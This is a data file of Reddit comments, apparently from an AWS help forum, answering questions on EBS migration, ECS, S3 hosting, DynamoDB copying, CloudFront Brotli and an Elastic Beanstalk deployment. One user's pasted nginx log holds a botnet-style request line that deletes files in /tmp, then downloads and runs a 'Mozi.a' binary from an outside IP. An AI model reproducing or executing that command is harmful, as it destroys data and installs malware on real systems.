g5gxn9c,itpmvw,"A single volume? Copy all the files off, dump them to S3, download the archive in Azure and unpack it. 

Many volumes? DD’ing would be the most automated, but yes it takes a long time.",1.0
g5itwuo,itpmvw,"Assuming that most of the files aren't changing day to day:

1. Create new empty volume and mount it on the same node.
2. run 'rsync' to copy all the data over. It will take a long time but that is fine.
3. Run it again
4. Take a downtime, run it a final time, remount the old drive in its place.

This works since \_usually\_ most of the files don't change. The first two copies just get the target drive 'close enough' such that the finaly copy is very quick as rsync will see it doesn't need to copy most of the data.",1.0
g5gty7s,itszqh,"ECS has service discovery integration with Route53. From the scheduled task, you can get all 3 IPs with SRV DNS lookup and hit all 3 java containers.

https://aws.amazon.com/blogs/aws/amazon-ecs-service-discovery/",2.0
g5i6qcd,itszqh,"Looks very helpful, I’ll see if I can get this to work. Thank you very much",1.0
g5gjvb2,itszqh,"&gt; for reasons that are beyond my control I am limited to storing and updating the cache inside these containers for the time being

If the constraints prevent a managed service being used would they allow a fourth container running memcached/whatever?

One option would be to use a StepFunction to hit the endpoints.

Another would be to build the refresh into the application running in the container.

To communicate to the containers you can either put them inside the same task so they can communicate via the ENI, or if they're in their own tasks you will need to access them via what they expose ""publicly"".",1.0
g5gl7sm,itszqh,"Thank you for the response.  


&gt;If the constraints prevent a managed service being used would they allow a fourth container running memcached/whatever?

Nope, the constraints prevent me from making any changes to the how the cache is implemented, at least in the near future.  


&gt;One option would be to use a StepFunction to hit the endpoints.

Since there is only end point (say /cache/refresh), is there a way I can route/duplicate that request to  all 3 containers only once?  


&gt;Another would be to build the refresh into the application running in the container.

I am evaluating this too but it is preferable to make as few changes as possible to the actual application code, so I am mostly looking for something outside of the application that would call the refresh end point. If nothing else works, I guess I would have to take this route.  


&gt;To communicate to the containers you can either put them inside the same task so they can communicate via the ENI, or if they're in their own tasks you will need to access them via what they expose ""publicly"".

Thank you for the direction. I am new to ECS but I will look into this first.

Edit: Formatting",1.0
g5gv9ax,itmgm1,Can you elaborate on your question? I’m not completely clear what you are asking.,2.0
g5hqkax,itmgm1,i think what i need was a replica that can read and write,1.0
g5navbe,itmgm1,That’s not really a replica. That’s a multi-master cluster. Only some DB engines support this and you have to set it up that way when you build the cluster.,1.0
g5gmcfe,itsdaq,"I'm not too familiar with Stata, but if you can install it on a Windows/Linux VM and there are no challenges around core licensing, yes you should be fine.

Yuo can calculate the price yourself, but have a look here at the EC2 instance types available.

[https://aws.amazon.com/ec2/pricing/on-demand/](https://aws.amazon.com/ec2/pricing/on-demand/)

&amp;#x200B;

Dont use t3 for your use case. Depending on what you want for Core/RAM, you probably want to look at the M5 series. dont neglect spot pricing, you have a pretty good chance at running for 12 hours without being shut down and it can save you like 75%.",1.0
g5htkxq,itsdaq,"I would even recommend trying ""spot instances"" with block time. Could save some money.",1.0
g5izwgu,itlx32,"Hi Nosa,

I used CloudFormer for a similar purpose recently: to capture the state of the entire infrastructure.  I found CloudFormer to be pretty much as described on the box.  It had trouble sussing out Templates for IAM stuff, but the rest was straightforward.

for me, it became a gateway to using CloudFormation to describe and provision all the infrastructures.

I’ve been deep diving into CF, so please feel free to ask questions",1.0
g5jb0f4,itlx32,Thanks. Where you able to restore the infrastructure from the template created by Cloud Former.,2.0
g5khvm2,itlx32,"The surrounding infrastructure has changed since then (sec group ids etc) that I would edit them slightly, but I’m reasonably sure I could restore them",1.0
g71ex0x,itlx32,"Recommend checking out [Former2](https://github.com/iann0036/former2), as [CloudFormer is no longer actively developed](https://github.com/aws-cloudformation/aws-cloudformation-coverage-roadmap/issues/439#issuecomment-611676438)",1.0
g5gpc9m,itr6d6,"What security group do you have attached to the RDS instance?  You only show the proxy and lambda above.

Note: it isn’t recommended to use the same security group for a lambda and database.  You really should create dedicated groups for your lambda component and database component.",1.0
g5h098f,itr6d6,"I found out the answer was related to the IAM role attached to the whole proxy, I forgot to give it the correct permissions.

Btw thanks for the note, it's on a personal account it's just a PoC for my app. Of course I'd create different groups",1.0
g83lkzp,itr6d6,"Hi , I too facing same issue, What permissions needs to be given for the IAM role?  
Help please.",1.0
g87soce,itr6d6,Check ur SG groups. If u let AWS create the IAM role you should be fine.,1.0
g5g8xar,itnnpg,"If you want to host several websites or services, Heroku can get expensive because one dyno is for one app only. If you use virtual private server like EC2 you can host many apps on one instance thus save money.",2.0
g5fxqex,itnnpg,"I’ve hosted the back end of my mobile app in production on heroku. It was okay, it’s not like I had big traffic. You have to pay for the 1 dyno. If you ask the AWS crowd they’ll tell you heroku is weak, which it is compared to AWS. But if you’re not running anything special, heroku is alright",1.0
g5fzjth,itnnpg,"They have extremely predatory sales practices once you're contracted with them, for one.

Also, nothing they do is really all that special. It's easily accomplished directly in AWS.",1.0
g5fkzzi,itmr9k,aws configure?,3.0
g5fl2jm,itmr9k,I did rhat but it shows the old id,1.0
g5j29s2,itmr9k,"It shows you the previous values but allows you to override them. You can put in a new value, or leave it empty to keep the old value.

All of this is saved to `%USERPROFILE%\.aws` so you can edit it manually there.",2.0
g5fo6rd,itmr9k,"Here’s some documentation.


https://docs.aws.amazon.com/cli/latest/reference/iam/update-access-key.html",2.0
g5gb3t7,itmr9k,"Somewhat best practice is to setup config and cred files in your windows user home directory.  Frequently I use the `--profile theProfileFromTheConfigFiles` parameter with the AWS cli to access resources in AWS.

[https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html)",1.0
g5fmxy7,itmayo,"With AWS, you always pay for what you use. So, you can do it cheaply, but if you aren't careful, the costs can add up.

Within the AWS free tier you can get 750 hours of a free server per month - which can be one instance, up 24 hours a day. It is a small amount of RAM and CPU, but generally enough for a small workload. 

You do have to monitor things like the amount of data that you are sending down to the client. But unless your sending GBs of data, nothing to worry about

Check what is in the free tier here: [https://aws.amazon.com/free](https://aws.amazon.com/free)

And you could try to calculate your costs here: [https://calculator.aws/#/](https://calculator.aws/#/)",4.0
g5gcg8v,itmayo,"there are two directions you can consider.

1. probably the easier, you set up an ec2 instance, or perhaps some amazon maintained ML instance, which is basically the same thing only easier to set up. you need to know the performance requirements, this can cost you from $15 up to hundreds.

2. go serverless. api gateway + lambda does the job, however, in this case you need to modify your program to not act as a server, just take data as parameter, and report the results in some form. the cost in this case depends on the memory and cpu requirement. for example if you specify 1.8G, and your algo runs 1s, you consume 1.8GBs per call, which will be ~2600 GBs per day. you get 60000 GBs for one $1.

to make a decision, you need to know how much RAM you need and how many CPUs you can use, and what is the total CPU requirement to complete one call.",1.0
g5fc5h3,itl66b,"Why? 

Why not just pass in JSON and let the serializer in the ASP.Net pipeline handle it before it gets to your controller action?

When I throw an entire API framework (ASP.Net or Node/Express) into Lambda, I want APIGW to be dumb.",2.0
g5fkn9y,itl66b,"Yeah, I am trying to avoid having to make a schema in the middleware for each object before gong to the controller, it seems very redundant.",1.0
g5h7774,itl66b,"You really don’t want to do that. It’s going to make it much harder to test locally and tie you to Lambda - two of the reasons you use ASP.Net with Lambda in the first place. 

Instead, do this. 


https://weblog.west-wind.com/posts/2017/sep/14/accepting-raw-request-body-content-in-aspnet-core-api-controllers


But this is extremely non idiomatic for a REST API. Even though you can. You shouldn’t.",1.0
g5fq56b,itkhk9,"I do not see this happening, it is one of Amazon's huge sources of profit.

Although if this happens, lots of additional services that depend on ebs could be cheaper.

&amp;#x200B;

If your instance does not run 24/7, when the instance is turned off you can change the disk type from gp2 to sc1 and significantly reduce costs. (75% savings).

&amp;#x200B;

Consider the following:

1. you need to write automation for this process.
2. Its possible to make a change to ebs once every 6 hours.
3. The minimum size of sc1 disk is 500Gb",7.0
g5fc2me,itkhk9,"Sure would be nice.  I reducing my bill by a huge percentage way back in the day after I converted all my EC2 MySQL databases from provisioned iops to the, at that time, new gp2.  Was a hero with the finance team.",5.0
g5glggl,itkhk9,"I would rather they eliminate their network transfer tax when sending data to any aws service (eg cloudwatch logs, kinesis, etc). I would be okay if it requires explicitly creating vpc private endpoints for each of the services. This cost us tens of thousands. Right now it is only free for s3 and ddb.",5.0
g5flje7,itkhk9,"The economics around block storage is going to be one the biggest factors that drive workloads back to our data center. It's hard to explain to finance people why the $/GB of our SAN purchases keep declining yet it has stayed the same in the cloud. When you factor in that we trust the performance and reliability with compression and deduplication now, cloud just looks slow to evolve.",3.0
g5grbty,itkhk9,"Cloud and prem are two different pricing models.  Of course prem will always be cheaper if you're just looking at infra costs (you can depreciate HW over time).  The benefit (at least for us) of cloud is that we don't need specialized folks to manage the infra and we can do things in the cloud we were never able to do on prem.

It's a decision every company has to make and--sure--there will be some that go all-in on the cloud and then determine it's too much $$ for what they're getting out of it and pull it back on prem.",2.0
g5gl0fq,itkhk9,"When you consider all things AWS didn't make any profit @ launch. DC havy usage drives are expensive, you need big ammounts of network bandwitch etc. Competition and market wise AWS dosnt have any real market drives to reduce prices. They will try to add features and increase performance all while saying the $/IOPS or other metrics have improved.",1.0
g5euu73,iti4mj,Did you check the security group rules?,1.0
g5g1w52,iti4mj,"Hi, thanks for the reply. Can you elaborate little more on this? I am not sure what exactly to check about, in the security groups.

EDIT: I checked the security groups. I checked inbound &amp; outbound rules which are open to full internet (0.0.0.0/0) on port80 for HTTP protocol. Is that what you meant? Is there any issue with this particular setting?",1.0
g5g4tk5,iti4mj,Check that the relevant ports in the security group of the database are open to your EB.,1.0
g5gcjsp,iti4mj,"Hi, so just for the heck of it, inside the Atlas environment,   I whitelisted all IPs and created a new beanstalk project from the ground up - to see if I could still connect to Atlas.

I am getting a \`502 Bad Gateway Error (niginx)\` when I open the app's link. Following is the log. It seems that initially there was an authentication error, but later the app got connected to DB (at around 08:16 timestamp) for all subsequent requests.

Log message for \`web.stdout.log\`

    Sep 16 08:06:13 ip-172-31-44-15 web: &gt; Elastic-Beanstalk-Sample-App@0.0.1 start /var/app/current
    Sep 16 08:06:13 ip-172-31-44-15 web: &gt; node app.js
    Sep 16 08:06:13 ip-172-31-44-15 web: Server running at http://127.0.0.1:8080/
    Sep 16 08:10:10 ip-172-31-44-15 web: &gt; docker-node-mongo@1.0.0 start /var/app/current
    Sep 16 08:10:10 ip-172-31-44-15 web: &gt; node index.js
    Sep 16 08:10:11 ip-172-31-44-15 web: Debugging (personal note): process.env.DATABASE_PWD is undefined in this environment
    Sep 16 08:10:11 ip-172-31-44-15 web: Server running at  3000
    Sep 16 08:10:11 ip-172-31-44-15 web: MongoDB freaking connection error msg:  authentication fail
    Sep 16 08:10:11 ip-172-31-44-15 web: MongoError: authentication fail
    Sep 16 08:10:11 ip-172-31-44-15 web: at /var/app/current/node_modules/mongodb-core/lib/topologies/replset.js:1462:15
    Sep 16 08:10:11 ip-172-31-44-15 web: at /var/app/current/node_modules/mongodb-core/lib/connection/pool.js:868:7
    Sep 16 08:10:11 ip-172-31-44-15 web: at /var/app/current/node_modules/mongodb-core/lib/connection/pool.js:844:20
    Sep 16 08:10:11 ip-172-31-44-15 web: at finish (/var/app/current/node_modules/mongodb-core/lib/auth/scram.js:232:16)
    Sep 16 08:10:11 ip-172-31-44-15 web: at handleEnd (/var/app/current/node_modules/mongodb-core/lib/auth/scram.js:242:7)
    Sep 16 08:10:11 ip-172-31-44-15 web: at /var/app/current/node_modules/mongodb-core/lib/auth/scram.js:351:15
    Sep 16 08:10:11 ip-172-31-44-15 web: at /var/app/current/node_modules/mongodb-core/lib/connection/pool.js:531:18
    Sep 16 08:10:11 ip-172-31-44-15 web: at processTicksAndRejections (internal/process/task_queues.js:79:11) {
    Sep 16 08:10:11 ip-172-31-44-15 web: errors: [
    Sep 16 08:10:11 ip-172-31-44-15 web: {
    Sep 16 08:10:11 ip-172-31-44-15 web: name: 'bsrcluster1-shard-00-01.njwnt.mongodb.net:27017',
    Sep 16 08:10:11 ip-172-31-44-15 web: err: [MongoError]
    Sep 16 08:10:11 ip-172-31-44-15 web: }
    Sep 16 08:10:11 ip-172-31-44-15 web: ],
    Sep 16 08:10:11 ip-172-31-44-15 web: [Symbol(mongoErrorContextSymbol)]: {}
    Sep 16 08:10:11 ip-172-31-44-15 web: }
    Sep 16 08:16:22 ip-172-31-44-15 web: &gt; docker-node-mongo@1.0.0 start /var/app/current
    Sep 16 08:16:22 ip-172-31-44-15 web: &gt; node index.js
    Sep 16 08:16:23 ip-172-31-44-15 web: Server running at  8081
    Sep 16 08:16:23 ip-172-31-44-15 web: OMG MongoDB Freaking Connected
    Sep 16 09:04:36 ip-172-31-44-15 web: &gt; docker-node-mongo@1.0.0 start /var/app/current
    Sep 16 09:04:36 ip-172-31-44-15 web: &gt; node index.js
    Sep 16 09:04:37 ip-172-31-44-15 web: Server running at  7777
    Sep 16 09:04:37 ip-172-31-44-15 web: OMG MongoDB Freaking Connected

Apparently, there has been some kind of problem with nginx server all along with regards to connection:

    2020/09/16 08:35:51 [error] 4716#0: *20 connect() failed (111: Connection refused) while connecting to upstream, client: 35.175.233.39, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:35:52 [error] 4716#0: *22 connect() failed (111: Connection refused) while connecting to upstream, client: 54.86.39.63, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:35:52 [error] 4716#0: *24 connect() failed (111: Connection refused) while connecting to upstream, client: 3.91.234.245, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:35:52 [error] 4716#0: *26 connect() failed (111: Connection refused) while connecting to upstream, client: 3.91.234.245, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:35:54 [error] 4716#0: *28 connect() failed (111: Connection refused) while connecting to upstream, client: 52.18.179.135, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:35:55 [error] 4716#0: *30 connect() failed (111: Connection refused) while connecting to upstream, client: 217.182.175.162, server: , request: ""HEAD / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:37:00 [error] 4716#0: *32 connect() failed (111: Connection refused) while connecting to upstream, client: 88.99.195.239, server: , request: ""GET /robots.txt HTTP/1.1"", upstream: ""http://127.0.0.1:8080/robots.txt"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:37:00 [error] 4716#0: *34 connect() failed (111: Connection refused) while connecting to upstream, client: 88.99.195.239, server: , request: ""GET /&amp;quot HTTP/1.1"", upstream: ""http://127.0.0.1:8080/&amp;quot"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:38:34 [error] 4716#0: *36 connect() failed (111: Connection refused) while connecting to upstream, client: 52.204.27.85, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:38:34 [error] 4716#0: *38 connect() failed (111: Connection refused) while connecting to upstream, client: 52.204.27.85, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:41:38 [error] 4716#0: *40 connect() failed (111: Connection refused) while connecting to upstream, client: 3.236.148.248, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 08:47:25 [error] 4716#0: *42 connect() failed (111: Connection refused) while connecting to upstream, client: 111.161.130.63, server: , request: ""GET /shell?cd+/tmp;rm+-rf+*;wget+http://111.161.130.63:52354/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1"", upstream: ""http://127.0.0.1:8080/shell?cd+/tmp;rm+-rf+*;wget+http://111.161.130.63:52354/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"", host: ""3.7.241.150:80""
    2020/09/16 08:51:29 [error] 4716#0: *44 connect() failed (111: Connection refused) while connecting to upstream, client: 18.205.72.90, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 09:05:40 [error] 5739#0: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 49.37.197.215, server: , request: ""GET / HTTP/1.1"", upstream: ""http://127.0.0.1:8080/"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com""
    2020/09/16 09:05:42 [error] 5739#0: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 49.37.197.215, server: , request: ""GET /favicon.ico HTTP/1.1"", upstream: ""http://127.0.0.1:8080/favicon.ico"", host: ""aaron-tut.ap-south-1.elasticbeanstalk.com"", referrer: ""http://aaron-tut.ap-south-1.elasticbeanstalk.com/""

EDIT 1:

Conclusion:

* Whitelisting all IPs ensures that AWS Beanstalk could connect to Atlas (but I still need to figure out how to safely make the IP elastic without crashing the app).
* I need to resolve the Nginx 502 bad gateway error

EDIT 2;

Holyshit, I found out the mistake issue regarding the nginx server. Inside the app.js, I had set process.env.port instead of process.env.PORT. So, somehow beanstalk was assigning port 8080 to my app but since it was assigned to 'PORT' ( not 'port' ), there was a communication issue between my node server &amp; nginx server. 

This is a weird behaviour though since from my side, I explicitly set an environment variable called 'port' inside the beanstalk environment. That should helped launch the app even though it didn't. Wondering why though....

I still need to figure out how to reliably set Elastic IP instead of whitelisting inside Atlas.

EDIT 3:

Holy shitttt. I. Made. It. Yes once the Ngnix issue was resolved, it turns out that assigning Elastic IP was a straightforward business. Then I whitelisted this IP inside Atlas and Voila, app got launched !!

I am still wondering why even though I assigned an explicit environment variable called 'port' the beanstalk environment the app didn't identify it and why the issue got resolved only when i changed it to process.env.PORT inside the app.",1.0
g5fnp1y,iti4mj,"Having an elastic IP shouldn't cause the instance to go into a SEVERE state. Not sure that would be correlated. Interesting though.

Is your instance in a public subnet? An elastic IP gives you a consistent IP so when you reboot your instance, your IP doesn't change. But it does not mean that it gives you outbound access to the internet unless you have configured your instance to be in a public subnet. (And don't forget about security - once your instance is in a public subnet, it is accessible to the internet, so make sure inbound ports are behind a firewall.)

What do you currently have whitelisted in Atlas?",1.0
g5g52tg,iti4mj,"Hi, thanks for replying.

&gt;Is your instance in a public subnet?

I checked the IP Addresses Console and it says that this IP address is Public, so I assume that's what it means when you asked if it was in a public subnet (Please correct me if i am missing something).


&gt;What do you currently have whitelisted in Atlas?

This public Elastic IP address assigned to the instance.


I also checked the 'Enhanced Overview Panel' and this is what it says:

* 100.0 % of the requests are failing with HTTP 5xx.
* ELB processes are not healthy on all instances.

&amp;#x200B;


&gt;once your instance is in a public subnet, it is accessible to the internet, so make sure inbound ports are behind a firewall

If I am deploying a website on the instance, shouldn't it be accessible to everyone on the internet to view the website (I have mentioned in the other comment regarding inbound &amp; outbound rules allowing sources from all of the internet viz. 0.0.0.0/0)?",1.0
g5eyp7a,itisoy,"remember that you're responsible to secure you're bucket though - they keep it online, and stop themselves from being compromised.  


If your usecase is as simple as it sounds, you have nothing to worry about, but if you have something you don't want seen, make sure it isn't in the website bucket.

Also remember to protect access to the AWS account itself!",3.0
g5f3exc,itisoy,"Thanks for the tips. Planning to use Cloudfront as the CDN and for security purposes as well as the benefits it offers with its Edge locations. 

It will just be a simple landing page I drive traffic to as a pre-sell page with a CTA button to click over to an offer page; pretty straight forward.",1.0
g5f11at,itisoy,Keep in mind that they provide the storage service with a high amount of durability but that also means if you overwrite or delete your objects they will durably delete or replace your data.  Your responsibility to protect yourself with versioning or replication and manage it all.,3.0
g5eqmr8,itisoy,"Yes. It’s managed object storage. In the simplest terms, you can think about it like a remote file system that exits in the cloud (as opposed to on disk). 

You can configure your s3 bucket to act a “webpage”!in the bucket settings. If you don’t need a backend, s3 works great for simple pages/sites.",2.0
g5erxo3,itisoy,"Thanks! So Amazon will manage the cloud etc and I don't need to worry about downtime etc? Also, I am guessing that it will have no problem with traffic spikes? Thanks again.",2.0
g5esrb4,itisoy,"S3 is one of the most highly available managed services in the history of the internet (and that’s not an exaggeration). If client machines are just requesting static assets from your s3 buckets (eg. Html, css, JavaScript, images, etc), it would take a literal act of god for it to go down. If you’re really worried about it you can put a cdn in front of your bucket. 


https://aws.amazon.com/blogs/networking-and-content-delivery/amazon-s3-amazon-cloudfront-a-match-made-in-the-cloud/

Not sure how You plan on managing dns but The advantages of this route also include a free ssl cert from amazon you can assign to the cdn.",3.0
g5etwc0,itisoy,Many thanks for your response. I know there's route 53 for the dns but I'll probably be getting my domain from Namecheap and then just transfer it over to the route 53. Definitely requesting the ssl cert. Thanks for the article.,1.0
g5euh0s,itisoy,"There’s an extra step if you don’t register the domain through aws, but otherwise the setup will still work fine if you buy the domain from someone else. Good luck.",1.0
g5ev4jy,itisoy,thank you,1.0
g5fk41o,itisoy,"Yes, you don’t need to worry about S3 going down.

HOWEVER, you are responsible for your data and your bucket’s security. 

If you delete all the data out of it? Your fault, your problem, AWS doesn’t keep backups for you. 

If you leave the bucket permissions wide open and someone either puts data in or takes data out that they aren’t supposed to? Your problem. 

AWS provides the service, AWS maintains the service, if you misuse and mismanage your portion of it. that’s not their problem",1.0
g5fnke8,itisoy,Thanks! What's the best way to secure it? Encryption?,1.0
g5g5wu8,itisoy,"Encryption yes, but you can also define who you allow access to what files (or objects). Make sure the files that you want public are, but even more important is making sure you want to be private are actually private",1.0
g5fp1vg,itisoy,"&gt;Yes, you don’t need to worry about S3 going down.
&gt;

Sure about that?

https://www.theverge.com/2017/3/2/14792442/amazon-s3-outage-cause-typo-internet-server",1.0
g5fptej,itisoy,"Yes, I lived through that, I was on call that day. Let me reiterate. You don’t need to worry about S3 going down.


Here’s the hard facts: for the vast majority of customers, it’s not worth the time, effort, or financial hit to go fully redundant across multiple regions. Some customers exist where it’s reasonable, Ive supported those customers, they are the minority. 

For everyone else— all the people who are single region— it doesn’t matter if S3 can or cannot go down. There’s nothing you can do to make it better, there’s nothing you can do to make it worse, and if it does go down, there’s nothing you can do to fix it faster. It is 100% out of your hands, out of your control, and 99% out of your ability to work around. 

If S3 goes down, new EC2 instances are out the window. New EBS volumes from snapshots are out the window. Existing EC2 instances that haven’t fully hydrated yet, are out the window. CodeCommit? Gone. Cloudwatch Logs? Gone. ECR? Gone. Lambda? Gone. Amazon Linux package repositories? Gone. So much more crap that we probably don’t even realize— or that depend on one of the above services behind the scenes? Gone. 

We are talking a blast radius of an entire region just disappearing until it’s back up. 

So, let me re-iterate, it’s not worth it for the vast majority of customers to go multi-region. Therefore it’s out of scope for any DR plans, therefore it’s not something you worry about.",1.0
g5g4ppv,itisoy,"True. You’re right, he should do what Netflix did and spend millions of dollars to handle the .01 percent chance s3 goes down for... his landing page. 


https://www.networkworld.com/article/3178076/why-netflix-didnt-sink-when-amazon-s3-went-down.html

All the major points have been made for OP. 

- yes is managed. 
- be careful with bucket permissions
- don’t let anything sensitive in your bucket
- protect your aws account 

This comment adds nothing to the conversation, or op. You are literally THAT guy",1.0
g5gaj1f,itisoy,"This really depends on your definition of managed services.  In many regards, it is a managed service between you and AWS. It's not a managed service between your clients/customers and AWS.

You should maybe look at this document: [https://aws.amazon.com/compliance/shared-responsibility-model/](https://aws.amazon.com/compliance/shared-responsibility-model/)

Take that matrix into consideration when providing an SLA to your clients. AWS out of the box is not a 100% guarantee. You could easily misconfigure S3 and allow all your clients to be compromised, loose their data, etc and you as the provider would probably be liable.

Essentially AWS provides the fuel, it's up to you to keep things comfortably warm or set them on fire.",1.0
g5hfo2l,itisoy,Thanks! I will check it out. Does so much consideration really matter if I am creating a simple landing page that will direct the user to a separate offer page (which I don't own)?,1.0
g5llrcu,itisoy,"&gt;allow all your clients to be compromised

So, getting it SSL certified won't fix this problem? Thanks!",1.0
g5f13ty,itimpn,"This lead me down a google hole. It really seems like a lot of AWS services are dropping the ball on custom cipher lists for TLS, and moreover a lot are missing support for TLS 1.3.

I didn't test this, and the fact that my arm is currently broken de-motivates me from trying, but I think you could use an ELB with a custom security policy to meet your needs:  


[https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/ssl-config-update.html](https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/ssl-config-update.html)  


So I am proposing the API gateway in a private endpoint mode, and have the ELB in front of it to accept traffic from your customers, whether they be on the internet or inside your VPC/corp network.",1.0
g5f1yll,itimpn,This is exactly what we are trying to avoid. Just placing another resource in front is a bit of a stretch.,1.0
g5f2hdn,itimpn,"I feel you, it sucks. ELB's probably less maintenance than HA proxy on Ec2, but I understand price may be a factor.

I'd submit a ticket on this if you can, add your story to the feature request.",1.0
g5f6rfg,itimpn,Thank you. Where can I add the story?,2.0
g5fgcdh,itimpn,"if you have a TAM or account rep, through them. If not, you can raise it with a support ticket.",1.0
g5etfd6,itimlj,"Updating every record in the source table just to push it out to the stream seems excessive — and expensive!

Have you tried setting up the stream then scanning the source table and doing conditional writes to the destination table? If an item is updated organically and written to the destination table before your scan gets to it, the conditional write will fail and your scanner can move on to the next item.

Also, it might be worth investigating switching the tables to provisioned capacity while you do the migration. That would give you more control to ensure you can finish the migration within your time window.

And finally, I’d talk to AWS about what you’re planning to do and your constraints. They might have better solutions than random people on the internet.",7.0
g5fgamq,itimlj,"Agree, definitely talk to your AWS reps about this",3.0
g5h3wb3,itimlj,"So I asked AWS and they recommended to create a new table from a backup of the current table (but they said they can't say how long that might take for 14 mil), or to use AWS Data Pipeline and gave a bunch of info.  Honestly, both those suggestions seem bad to me, but what do I know!?  I managed to just stop using the dynamodb stream and directly scan / write from table A to table B in lambda which was able to do the 14 mil in 1 hour or so.",2.0
g5ewapl,itimlj,I like your conditional write suggestion.  I may give this a try.,1.0
g5fh29i,itimlj,"The correct answer is EMR.

https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EMRforDynamoDB.Tutorial.html",5.0
g5fo12d,itimlj,"Given the option of a faster algorithm or another computer, always pick the latter. EMR is definitely the right tool for the job here. There's even a pre existing template for it in data pipeline. 

You could also use glue but that would be more expensive than EMR.",3.0
g5g8su7,itimlj,"&gt; Given the option of a faster algorithm or another computer, always pick the latter.

... is this satire?",1.0
g5h08d4,itimlj,where is this template you speak of?,1.0
g5h7q5r,itimlj,"There one in the web console when making a new pipe line. There are also a bunch more pipeline samples here

""data-pipeline-samples/samples at master · amazon-archives/data-pipeline-samples · GitHub"" https://github.com/amazon-archives/data-pipeline-samples/tree/master/samples",1.0
g5gzxex,itimlj,"Have you used this to do migrate tables?  It seems like I'd need to scan through the entire table and export the data, then import it into hive, then import it back into dynamo.  This doesn't seem like it would be quicker than scanning the table and writing directly into a new table.",1.0
g5h279v,itimlj,The raw network I/o is the same.  Savings come from zero code and reliability is handled by Apache HIVE.,2.0
g5eq47r,itimlj,Parallel Scan and write the entries to the new table?,3.0
g5ewc31,itimlj,yeah we may just end up doing this instead of our dynamodb streams.  I think we went down a wrong path.,2.0
g5esekv,itimlj,"Spin up a large EC2 instance to get some good network bandwidth and memory and add the dynamo gateway endpoint. 

Scan all the records into memory or disk (14 million can’t be that large) and then batch write them into the new table.

Also, backup and restore the table? Not sure of timing on that one.",2.0
g5drxl9,ite4im,Here's the [AWS What's New announcement for CloudWatch Dashboard Sharing](https://aws.amazon.com/about-aws/whats-new/2020/09/amazon-cloudwatch-dashboards-supports-sharing/),7.0
g5gjnnt,ite4im,Awesome stuff - thanks!,2.0
g5f3urb,ithz5w,"""If I am already allowing GZIP compression in Cloudfront, what do I need to do to also allow Brotli?""

Nothing, I discover, after ten minutes fiddling about.

Saved you ten minutes.

LATER or maybe not. Maybe the documentation is so complicated that it takes a wizard or a warlock to read it, not a normal human being. Bad Amazon.",53.0
g5f97ie,ithz5w,Some heroes don't wear capes..,12.0
g5fvt06,ithz5w,"The docs say you must enable it in your cache policy.

[https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/ServingCompressedFiles.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/ServingCompressedFiles.html)

My distribution is set to ""legacy cache settings"" and it is not doing brotli.",9.0
g5g8w7a,ithz5w,"Eurgh. The documentation is opaque - and it doesn't look like you can do any of this in the console.

Sorry folks.",4.0
g5gim4n,ithz5w,"Documentation is totally opaque indeed.

I was able to enable it using the console:

1. Create a new Policy, enabling Brotli compression
2. Update the Distribution Behavior to use this policy (instead of legacy or a managed one)
3. Wait for the distribution to be updated
4. Invalidate cache

Now brotli compression is returned for \`accept-encoding: gzip, deflate, br\`

&amp;#x200B;

My setup is very basic: CF with S3 backend. No header whitelist, no QueryString whitelist. No compression at the origin.",3.0
g5gbvp7,ithz5w,"I think if you used the Managed Optimized for Uncompressed cache policy it might work (or a custom policy that did the same), but I didn't get that far. I didn't see it work using legacy cache settings.

Instead I got stuck in to trying to define my own custom policy through Serverless/CloudFormation and got completely stuck. I'll need that to work before I can enable brotli through a cache policy for my production setup.",2.0
g5ftoqc,ithz5w,"Really? I'm not seeing this working. Although I also don't see anything in the settings that would help.

My request says: Accept-Encoding: gzip, deflate, br

But the reply always has: content-encoding: gzip

For all file types. The origin is S3, and I've tried an invalidate on the cloudfront.

I'm getting br encoding back from non-cloudfront sources successfully.",3.0
g5g4ir6,ithz5w,The order of Accept-Encoding defined your priority.,2.0
g5g7g4q,ithz5w,"That's from the browser, I can't control it. It works with Apache servers like that. And I tried just brotli using curl and still nothing from CF.",1.0
g5eytf2,ithz5w,aws cdn goes br,87.0
g5eqhsz,ithz5w,Bro,12.0
